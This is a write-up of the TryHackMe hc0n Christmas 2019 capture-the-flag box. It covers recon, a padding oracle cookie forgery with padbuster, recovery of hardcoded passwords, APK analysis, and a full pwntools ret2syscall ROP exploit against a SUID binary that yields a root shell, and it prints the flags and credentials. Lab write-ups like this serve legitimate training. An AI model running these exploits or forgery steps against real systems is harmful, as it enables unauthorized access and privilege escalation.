<img width="1245" height="639" alt="image" src="https://github.com/user-attachments/assets/0e68d6d6-e627-47b0-9fca-e85b8a8a3397" /># TryHackMe — hc0n Christmas CTF 2019 | Full Writeup

A Christmas-themed CTF from h-c0n 2019. The chain involves cookie padding oracle, binary reverse engineering, Android APK analysis, and a ret2syscall ROP chain for root.

---

## 1. Reconnaissance

```bash
nmap -sC -sV -p- --open $IP
```

```
PORT     STATE SERVICE
22/tcp   open  ssh        OpenSSH 7.2p2
80/tcp   open  http       Apache/2.4.18
8080/tcp open  http-proxy → returns: RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=
```

Port 8080 returns a Base64 blob on every request — AES-CBC encrypted data, we'll need a key for it later.

---

## 2. Web Enumeration

```bash
ffuf -u http://$IP/FUZZ -e .php,.txt,.html -fc 404 -t 250 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key findings:

| Path | Note |
|------|------|
| `robots.txt` | Username + iv.png hint |
| `login.php` / `register.php` | Auth pages |
| `/hide-folders/` | Directory listing |
| `/admin/` | Contains APK |
| `/classes/` | PHP backend |

**robots.txt:**

```
#Administrator for / is: administratorhc0nwithyhackme
#remember, remember the famous group 3301 to solve this, the secret IV wait for you!
User-agent: *
Allow: iv.png
```

`iv.png` contains **Elder Futhark runes** (Cicada 3301 theme) — a red herring for steganography, the real path is the padding oracle below.

<img width="1568" height="721" alt="image" src="https://github.com/user-attachments/assets/795a94c2-7dc1-44c1-8f60-95f229f261a2" />


---

## 3. Padding Oracle Attack

Register an account → login → inspect cookie in Burp:

```
hcon=ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng
```

Tamper with one character → server returns **"Invalid padding"** → classic Padding Oracle vulnerability (3DES-CBC, block size 8).

### Decrypt cookie

```bash
padbuster http://$IP/index.php \
  "ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" 8 \
  -cookies "hcon=ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" \
  -error "Invalid padding" -encoding 4
```

```
[+] Decrypted value: user=test
```

Cookie format confirmed: `user=<username>`.

### Forge admin cookie

```bash
padbuster http://$IP/index.php \
  "ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" 8 \
  -cookies "hcon=ZQd4aI4x8DBWVdBDTFmtoGMBKw%2FHnWng" \
  -error "Invalid padding" \
  -plaintext "user=administratorhc0nwithyhackme" -encoding 4
```

With the forged admin cookie, send an **OPTIONS** request to `/hide-folders/1/`:

<img width="1125" height="571" alt="image" src="https://github.com/user-attachments/assets/1fc88bc8-ca9b-46ec-9577-f94821025f2c" />


```bash
curl -X OPTIONS http://$IP/hide-folders/1/ -b "hcon=<FORGED_COOKIE>"
```

Response:

<img width="1245" height="639" alt="image" src="https://github.com/user-attachments/assets/6eb4fcfe-bbee-421f-8420-3a884103846f" />


```
hax0r :3 you win firts part of the ssh password
Gf7MRr55
```

> 🔑 **SSH password part 1 → `Gf7MRr55`**

---

## 4. Binary RE — hola

Found at `/hide-folders/2/hola`. Quick strings dump:

<img width="672" height="351" alt="image" src="https://github.com/user-attachments/assets/82c0d4d9-c693-4628-ba20-2247bbb7019a" />


```bash
strings hola
```

```
Enter your username:
Enter your password:
stuxnet
n$@#PDuliL
Welcome, Login Success! this is a second part of ssh password
```

Run it to confirm:

```
$ ./hola
Enter your username: stuxnet
Enter your password: n$@#PDuliL
Welcome, Login Success! this is a second part of ssh password
```

> 🔑 **SSH password part 2 → `n$@#PDuliL`**

---

## 5. Android APK — AES Scheme Discovery

Downloaded from `/admin/app-release.apk`:

```bash
apktool d app-release.apk -o apktool_out/
grep -r "SEARCHTHESECRET\|AES" apktool_out/smali/ -A 2
```

Inside `my_activity.smali`:

```smali
const-string v5, "SEARCHTHESECRETKEY"
const-string v2, "SEARCHTHESECRETIV"
const-string v6, "AES/CBC/PKCS5PADDING"
```

The app fetches the AES key and IV dynamically by searching the web for those strings — this decrypts the port 8080 blob. Not needed for the root path, but explains the mystery service.

---

## 6. SSH — User Flag

```
Username:  thedarktangent
Password:  Gf7MRr55n$@#PDuliL
           ^^^^^^^^  ^^^^^^^^^^
           part 1    part 2
```

```bash
ssh thedarktangent@$IP
cat user.txt
```

```
thm{hc0n_christmas_2019!!!}
```

Home directory has a suspicious file:

```
-rwsrwsr-x 1 root root 8952 Dec 10 2019 hc0n   ← SUID binary!
```

---

## 7. Privilege Escalation — ret2syscall ROP Chain

### Binary analysis

```bash
strings hc0n          # /bin/sh, setuid, fgets visible
objdump -d ./hc0n | grep -A 8 "<entree_"
```

The binary has 5 hand-crafted ROP gadgets:

| Function | Gadget | Address |
|----------|--------|---------|
| `entree_1` | `syscall; ret` | `0x4005fa` |
| `entree_2` | `pop rdi; ret` | `0x400604` |
| `entree_3` | `pop rsi; ret` | `0x40060d` |
| `entree_4` | `pop rdx; ret` | `0x400616` |
| `entree_5` | `pop rax; ret` | `0x40061f` |

**Protections:**

```bash
checksec --file=hc0n
```

```
NX:       enabled    ← no shellcode on stack
ASLR:     enabled    ← libc randomized (cat /proc/sys/kernel/randomize_va_space → 2)
Canary:   disabled   ← no stack protection
PIE:      disabled   ← binary addresses are static ✓
```

**Vulnerability:** `fgets` reads `0x400` bytes into a `0x30`-byte buffer → overflow at **offset 56**.

### Strategy — ret2syscall (no libc leak needed)

Since the binary has a built-in `syscall; ret` gadget and `.data` is writable, we bypass ASLR entirely:

1. **Stage 1 — sys_read(0, .data, 8):** write `/bin/sh` into `.data`
2. **Stage 2 — sys_execve(.data, 0, 0):** execute `/bin/sh` as root (SUID)

```python
#!/usr/bin/env python3
# exploit.py
from pwn import *
import time

path = './hc0n'
elf  = ELF(path)
rop  = ROP(elf)

shell = ssh('thedarktangent', '$IP',
            password='Gf7MRr55n$@#PDuliL', port=22)
r = shell.run('/home/thedarktangent/hc0n')

offset       = 56
data_section = elf.get_section_by_name('.data').header.sh_addr
cmd          = b'/bin/sh\x00'

pop_rax = rop.rax[0]
pop_rdi = rop.rdi[0]
pop_rsi = rop.rsi[0]
pop_rdx = rop.rdx[0]
syscall = rop.syscall[0]

# Stage 1: sys_read — write /bin/sh to .data
ropchain_read  = p64(pop_rax) + p64(0x0)
ropchain_read += p64(pop_rdi) + p64(0x0)
ropchain_read += p64(pop_rdx) + p64(len(cmd))
ropchain_read += p64(pop_rsi) + p64(data_section)
ropchain_read += p64(syscall)

# Stage 2: sys_execve — execute /bin/sh
ropchain_execve  = p64(pop_rax) + p64(0x3b)
ropchain_execve += p64(pop_rdi) + p64(data_section)
ropchain_execve += p64(pop_rdx) + p64(0x0)
ropchain_execve += p64(pop_rsi) + p64(0x0)
ropchain_execve += p64(syscall)

payload = b'A' * offset + ropchain_read + ropchain_execve
r.sendlineafter('(: \n\n', payload)
time.sleep(0.5)
r.send(cmd)
r.interactive()
```

```bash
# On Kali
scp thedarktangent@$IP:/home/thedarktangent/hc0n ./hc0n
pip3 install pwntools --break-system-packages
python3 exploit.py
```

```
$ whoami
root
$ cat /root/root.txt
thm{3xplo1t_my_m1nd}
```

---

## Attack Chain

```
nmap → 22, 80, 8080
  └─→ ffuf → robots.txt → username hint + iv.png (runes)
        └─→ register → login → hcon cookie
              └─→ Padding Oracle (padbuster) → forge admin cookie
                    └─→ OPTIONS /hide-folders/1/  →  SSH part 1: Gf7MRr55
                    └─→ /hide-folders/2/hola      →  SSH part 2: n$@#PDuliL
                    └─→ /admin/app-release.apk    →  AES/CBC scheme explained
                          └─→ ssh thedarktangent → user flag ✓
                                └─→ SUID hc0n → ret2syscall ROP → root flag ✓
```

---

## Tools

| Tool | Use |
|------|-----|
| `nmap` | Port scanning |
| `ffuf` | Directory fuzzing |
| `Burp Suite` | Cookie analysis & tampering |
| `padbuster` | Padding Oracle Attack |
| `strings` / `objdump` | Binary RE |
| `apktool` | Android APK decompile |
| `pwntools` | ROP exploit development |

---

## Flags

| | Value |
|-|-------|
| 🚩 user.txt | `thm{hc0n_christmas_2019!!!}` |
| 🚩 root.txt | `thm{3xplo1t_my_m1nd}` |

---
